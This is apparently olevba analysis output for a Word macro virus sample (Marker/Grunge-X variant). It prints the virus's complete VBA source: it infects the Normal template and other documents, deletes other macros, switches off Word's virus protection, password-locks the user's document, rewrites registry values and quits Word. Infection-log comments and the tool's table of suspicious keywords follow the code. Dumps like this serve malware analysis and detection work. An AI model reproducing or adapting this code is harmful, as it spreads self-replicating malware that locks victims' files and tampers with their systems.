olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.kh-dfc9bc04f1d4f021f6271fd2ef3dba7356ba22f4
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.kh-dfc9bc04f1d4f021f6271fd2ef3dba7356ba22f4 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Const Grunge = "< #  {Grunge-X Version 7010733465} I Hate EveryBody If EveryBody Not Like Me ! # >"

Private Sub Document_Open()
Document_Close
End Sub
Private Sub Document_Close()
Dim Breed As Object
Dim Polly, AName As String
Dim DS, NTS, Di, NTI As Boolean
Dim XJhie, Users, LogData, LogFile As String
Dim FileNumber
On Error Resume Next
AName = System.PrivateProfileString("", _
    "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "Grunge Include Day")
    
FileNumber = FreeFile
         Open Application.Templates.Application.Path & "\Engine.dll" & MyIndex For Output As #FileNumber
            Print #FileNumber, "'This Is Quick Load in your Documents"
            Print #FileNumber, "'====================================="
            Print #FileNumber, "Sub ToolsMacro()"
            Print #FileNumber, "With Assistant.NewBalloon"
            Print #FileNumber, ".Button = msoButtonSetOK"
            Print #FileNumber, ".Heading = " & Chr(34) & "GRUNGE Is Block Your System" & Chr(34)
            Print #FileNumber, ".Text = " & Chr(34) & "System Is Disabled By (Grunge)" & Chr(34) & "& Chr(13) & _"
            Print #FileNumber, Chr(34) & "You Can't Open VBMacro Code" & Chr(34) & "& Chr(13) & _"
            Print #FileNumber, Chr(34) & "On this time, because the System is Busy." & Chr(34) & "& Chr(13) & _"
            Print #FileNumber, Chr(34) & "please check on your administrator system." & Chr(34)
            Print #FileNumber, ".Show"
            Print #FileNumber, "End With"
            Print #FileNumber, "SendKeys " & Chr(34) & "{enter}Mail to : www.Grunge-X@usa.net{Enter}< I Hate EveryBody If EveryBody Not Like Me >{enter}{enter}This Document include Password{enter}by Grunge because you try to open my System {Enter}Password name is 'GRUNGE' i hope you member that." & Chr(34) & ", True"
            Print #FileNumber, "Application.ActiveDocument.Password=" & Chr(34) & "GRUNGE" & Chr(34)
            Print #FileNumber, "End Sub"
            Print #FileNumber, "Sub ViewVbCode()"
            Print #FileNumber, "ToolsMacro"
            Print #FileNumber, "End Sub"
            Print #FileNumber, "Sub ToolsOptions()"
            Print #FileNumber, "Options.SaveNormalPrompt = True"
            Print #FileNumber, "Options.SavePropertiesPrompt = True"
            Print #FileNumber, "Options.VirusProtection = True"
            Print #FileNumber, "ToolsMacro 'Dialogs(wdDialogToolsOptions).Show"
            Print #FileNumber, "End Sub"
            Print #FileNumber, "Sub FileOpen()"
            Print #FileNumber, "On Error Resume Next"
            Print #FileNumber, "Application.Caption = " & Chr(34) & "Include Grunge-X, please wait... " & Chr(34)
            Print #FileNumber, "ActiveWindow.Caption = ActiveDocument.Name"
            Print #FileNumber, "If Dialogs(wdDialogFileOpen).Show <> 0 Then"
            Print #FileNumber, "ActiveDocument.Save"
            Print #FileNumber, "End If"
            Print #FileNumber, "Application.Caption = " & Chr(34) & "Keep to Smile" & Chr(34)
            Print #FileNumber, "WordBasic.DisableAutoMacros False"
            Print #FileNumber, "Application.RecentFiles.Maximum = 0"
            Print #FileNumber, "End Sub"
            Print #FileNumber, "Sub AutoExit()"
            Print #FileNumber, "If (WeekDay(Date) = vbMonday)or (WeekDay(Date) = vbFriday) Then"
            Print #FileNumber, "Msgbox" & Chr(34) & "The Sun Is Gone But I Have I Light  (1967-1994)" & Chr(34) & ",48," & Chr(34) & "By Grunge-X" & Chr(34)
            Print #FileNumber, "Application.Quit"
            Print #FileNumber, "Else"
            Print #FileNumber, "Application.Quit"
            Print #FileNumber, "End IF"
            Print #FileNumber, "End Sub"
        Close #FileNumber
        Set NameModule = Application.NormalTemplate.VBProject.VBComponents.Import(Application.Templates.Application.Path & "\Engine.dll")
        NameModule.Name = "Grunge_Still_A_Live"
        For Each ObDel In NormalTemplate.VBProject.VBComponents
        If (ObDel.Name <> "ThisDocument") And (ObDel.Name <> "Grunge_Still_A_Live") Then
            Application.OrganizerDelete Source:=NormalTemplate.FullName, _
                Name:=ObDel.Name, Object:=wdOrganizerObjectProjectItems
            NormalTemplate.Save
        End If
    Next ObDel
On Error Resume Next
AddIns.Unload True
GoSub ShowMe
Options.VirusProtection = False
Application.UserName = "Grunge-X Include in"
Application.UserInitials = "Grunge-X"
Application.UserAddress = "Grunge-X@usa.net"
Application.EnableCancelKey = wdCancelDisabled
GoSub InsertIon
If (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", _
   "LogData in") = False) Then GoSub LoggingIn
If WeekDay(Now()) = 1 Then GoSub ShowMe
GoTo Finish
InsertIon:
Set AD = ActiveDocument.VBProject.VBComponents.Item(1)
Set NT = NormalTemplate.VBProject.VBComponents.Item(1)
Di = AD.CodeModule.Find(Grunge, 1, 1, 10000, 10000)
NTI = NT.CodeModule.Find(Grunge, 1, 1, 10000, 10000)
If (Di Xor NTI) And (ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate) Then
 If Di Then
   NTS = NormalTemplate.Saved
   XJhie = AD.CodeModule.Lines(1, AD.CodeModule.CountOfLines)
   For I = 1 To Len(Application.UserAddress)
    If (Mid(Application.UserAddress, I, 1) <> Chr(13)) Then
       If (Mid(Application.UserAddress, I, 1) <> Chr(10)) Then
          Users = Users & Mid(Application.UserAddress, I, 1)
       End If
    Else
       Users = Users & Chr(13) & " '"
    End If
   Next
   XJhie = XJhie & Chr(13) & _
         "'The Sun Is Gone But I have I Light" & Chr(13) & _
         "'================================================" & Chr(13) & _
         "'Date Infected : " & Format(Time, "hh:mm:ss AMPM-") & _
                Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
         "'User Infected : " & Application.UserName & Chr(13) & _
         "'Mail to       : " & Users & Chr(13) & Chr(13) & " "
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "Grunge Include Day") = 1
   NT.CodeModule.DeleteLines 1, NT.CodeModule.CountOfLines
   NT.CodeModule.AddFromString XJhie
   If NTS Then NormalTemplate.Save
 End If
 If NTI Then
    DS = ActiveDocument.Saved
    XJhie = NT.CodeModule.Lines(1, NT.CodeModule.CountOfLines)
    AD.CodeModule.DeleteLines 1, AD.CodeModule.CountOfLines
       '=======
   Set NameModule = Application.ActiveDocument.VBProject.VBComponents.Import(Application.Templates.Application.Path & "\Engine.dll")
        NameModule.Name = "Grunge_Still_A_Live"
   For Each ObDel In ActiveDocument.VBProject.VBComponents
        If (ObDel.Name <> "ThisDocument") And (ObDel.Name <> "Grunge_Still_A_Live") Then
            Application.OrganizerDelete Source:=ActiveDocument.FullName, _
                Name:=ObDel.Name, Object:=wdOrganizerObjectProjectItems
        End If
    Next ObDel
    f1 = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "SystemRoot")
    MkDir f1 & "\OSGrunge"
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "Grunge Include Day") = AName + 1
    Open f1 & "\OSGrunge\Grunge" & AName & ".ini" & MyIndex For Output As #FileNumber
        Print #FileNumber, " "
        Print #FileNumber, " "
        Print #FileNumber, "Date Infected : " & Format(Time, "hh:mm:ss AMPM") & " - " & Format(Date, "dddd  dd-mmmm-yyyy")
        Print #FileNumber, "User Infected : " & Application.UserName
        Print #FileNumber, "Mail to       : " & Application.UserAddress
        Print #FileNumber, "Number Inf    : " & AName
    Close #FileNumber
    AD.CodeModule.AddFromString XJhie
     If DS Then ActiveDocument.Save
 End If
End If
Return
LoggingIn:
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogData in") = True
   GoSub ShowMe
Return
ShowMe:
Dim FileSys As String
On Error Resume Next
 FileSys = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "SystemRoot")
 Open FileSys & "\Grunge-X.Htm" For Output As #1
        Print #1, "<html>"
        Print #1, "<head>"
        Print #1, "<title>I Hate EveryBody If EveryBody Not Like Me</title>"
        Print #1, "<meta name='Author' content='Include By Jhie-X'>"
        Print #1, "<body text='#FFFFFF' bgcolor='077d41' link='#FFFFFF' vlink='#FFFFFF' alink='#FFFFFF'>"
        Print #1, "<center><p align='center'><font color='#800000'size='6'>The Sun Is Gone But I Have I Light<strong></strong></font></p>"
        Print #1, "<p align='center'><font color='#000000' size='5'><strong><a href='mailto:WWW.Grunge@Usa.Net.com'>WWW.Grunge@Usa.Net</a></strong></font> </p>"
        Print #1, "<InTemp><font face='Arial,Helvetica'><font size=+2><b>Hey Guys How Are You Today</b></font>"
        Print #1, "<p><table BORDER=0 CELLSPACING=0 CELLPADDING=0 WIDTH='600' >"
        Print #1, "<tr>"
        Print #1, "<InTemp><center><img SRC='C:\Logo.sys' height=380 width=750 border=3></center>"
        Print #1, "</InTemp>"
        Print #1, "</tr>"
        Print #1, "</table>"
        Print #1, "<tr><InTemp><font face='arial, helvetica' size=-2><center>"
        Print #1, "<p><font face='Arial,Helvetica'><font size=-2>Copyright Jhie-X. All rights reserved"
        Print #1, "<br>Logo and website content are trademarks of Grunge Cooperation"
        Print #1, "</font></font></center>"
        Print #1, "</InTemp></tr></table>"
        Print #1, "</html>"
        Close #1
        System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\General", "Wallpaper") = FileSys & "\Grunge-X.Htm"
        System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Setup", "Wallpaper") = FileSys & "\Grunge-X.Htm"
        System.PrivateProfileString("", "HKEY_CURRENT_USER\Contrl Panel\Desktop", "Wallpaper") = FileSys & "\Grunge-X.Htm"
        System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "    * Grunge Still A Live *"
        System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "RegisteredOrganization") = "* Ujung Berung Bandung *"
        System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "ProductName") = "Grunge-X Created by X-Jhie"
        System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "Version") = "Grunge-X Version 7010733465"
        System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "DefName") = "Grunge-X Include on Your SoftWare"
        System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "DefCompany") = "Copyright By Grunge-X (I Hate EveryBody If EveryBody Not Like Me"""
Return
Finish:
End Sub

'The Sun Is Gone But I have I Light
'================================================
'Date Infected : 10:43:39 PM-Sunday, 23 Jul 2000
'User Infected : Grunge-X Include in
'Mail to       : Grunge-X@usa.net

 





'The Sun Is Gone But I have I Light
'================================================
'Date Infected : 11:08:56 BHO-I-Wednesday, 26 Jul 2000
'User Infected : Grunge-X Include in
'Mail to       : Grunge-X@usa.net

 


'The Sun Is Gone But I have I Light
'================================================
'Date Infected : 04:19:23 ABENK-Sunday, 30 Jul 2000
'User Infected : Grunge-X Include in
'Mail to       : Grunge-X@usa.net

 


'The Sun Is Gone But I have I Light
'================================================
'Date Infected : 10:25:31 -Kamis, 10 Agust 2000
'User Infected : Grunge-X Include in
'Mail to       : Grunge-X@usa.net

 


'The Sun Is Gone But I have I Light
'================================================
'Date Infected : 11:59:37 AM-Tuesday, 31 Oct 2000
'User Infected : Grunge-X Include in
'Mail to       : Grunge-X@usa.net

 


'The Sun Is Gone But I have I Light
'================================================
'Date Infected : 05:46:23 PM-Tuesday, 7 Nov 2000
'User Infected : Grunge-X Include in
'Mail to       : Grunge-X@usa.net

 


'The Sun Is Gone But I have I Light
'================================================
'Date Infected : 12:41:29 PM-Tuesday, 19 Dec 2000
'User Infected : Grunge-X Include in
'Mail to       : Grunge-X@usa.net

 


'The Sun Is Gone But I have I Light
'================================================
'Date Infected : 03:06:28 PM-Monday, 5 Mar 2001
'User Infected : Grunge-X Include in
'Mail to       : Grunge-X@usa.net

 


'The Sun Is Gone But I have I Light
'================================================
'Date Infected : 09:14:42 PM-Monday, 27 Aug 2001
'User Infected : Grunge-X Include in
'Mail to       : Grunge-X@usa.net

 


'The Sun Is Gone But I have I Light
'================================================
'Date Infected : 10:50:28 AM-Saturday, 6 Oct 2001
'User Infected : Grunge-X Include in
'Mail to       : Grunge-X@usa.net

 


'The Sun Is Gone But I have I Light
'================================================
'Date Infected : 04:26:26 PM-Friday, 12 Oct 2001
'User Infected : Grunge-X Include in
'Mail to       : Grunge-X@usa.net

 


'The Sun Is Gone But I have I Light
'================================================
'Date Infected : 05:33:13 PM-Friday, 26 Oct 2001
'User Infected : Grunge-X Include in
'Mail to       : Grunge-X@usa.net

 


'The Sun Is Gone But I have I Light
'================================================
'Date Infected : 03:52:20 PM-Tuesday, 30 Oct 2001
'User Infected : Grunge-X Include in
'Mail to       : Grunge-X@usa.net

 


'The Sun Is Gone But I have I Light
'================================================
'Date Infected : 07:02:07 PM-Wednesday, 31 Oct 2001
'User Infected : Grunge-X Include in
'Mail to       : Grunge-X@usa.net

 


'The Sun Is Gone But I have I Light
'================================================
'Date Infected : 05:08:59 PM-Saturday, 17 Nov 2001
'User Infected : Grunge-X Include in
'Mail to       : Grunge-X@usa.net

 


'The Sun Is Gone But I have I Light
'================================================
'Date Infected : 04:57:22 PM-Tuesday, 8 Jan 2002
'User Infected : Grunge-X Include in
'Mail to       : Grunge-X@usa.net

 


'The Sun Is Gone But I have I Light
'================================================
'Date Infected : 02:18:44 PM-Wednesday, 30 Jan 2002
'User Infected : Grunge-X Include in
'Mail to       : Grunge-X@usa.net

 


'The Sun Is Gone But I have I Light
'================================================
'Date Infected : 01:51:16 -ńđĺäŕ, 13 ôĺâ 2002
'User Infected : Grunge-X Include in
'Mail to       : Grunge-X@usa.net

 


'The Sun Is Gone But I have I Light
'================================================
'Date Infected : 10:25:20 dop.-pondělí, 4 III 2002
'User Infected : Grunge-X Include in
'Mail to       : Grunge-X@usa.net

 

-------------------------------------------------------------------------------
VBA MACRO Grunge_Still_A_Live.bas 
in file: Virus.MSWord.Marker.kh-dfc9bc04f1d4f021f6271fd2ef3dba7356ba22f4 - OLE stream: 'Macros/VBA/Grunge_Still_A_Live'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'This Is Quick Load in your Documents
'=====================================
Sub ToolsMacro()
With Assistant.NewBalloon
.Button = msoButtonSetOK
.Heading = "GRUNGE Is Block Your System"
.Text = "System Is Disabled By (Grunge)" & Chr(13) & _
"You Can't Open VBMacro Code" & Chr(13) & _
"On this time, because the System is Busy." & Chr(13) & _
"please check on your administrator system."
.Show
End With
SendKeys "{enter}Mail to : www.Grunge-X@usa.net{Enter}< I Hate EveryBody If EveryBody Not Like Me >{enter}{enter}This Document include Password{enter}by Grunge because you try to open my System {Enter}Password name is 'GRUNGE' i hope you member that.", True
Application.ActiveDocument.Password = "GRUNGE"
End Sub
Sub ViewVbCode()
ToolsMacro
End Sub
Sub ToolsOptions()
Options.SaveNormalPrompt = True
Options.SavePropertiesPrompt = True
Options.VirusProtection = True
ToolsMacro 'Dialogs(wdDialogToolsOptions).Show
End Sub
Sub FileOpen()
On Error Resume Next
Application.Caption = "Include Grunge-X, please wait... "
ActiveWindow.Caption = ActiveDocument.Name
If Dialogs(wdDialogFileOpen).Show <> 0 Then
ActiveDocument.Save
End If
Application.Caption = "Keep to Smile"
WordBasic.DisableAutoMacros False
Application.RecentFiles.Maximum = 0
End Sub
Sub AutoExit()
If (WeekDay(Date) = vbMonday) Or (WeekDay(Date) = vbFriday) Then
Msgbox "The Sun Is Gone But I Have I Light  (1967-1994)", 48, "By Grunge-X"
Application.Quit
Else
Application.Quit
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Engine.dll          |Executable file name                         |
+----------+--------------------+---------------------------------------------+
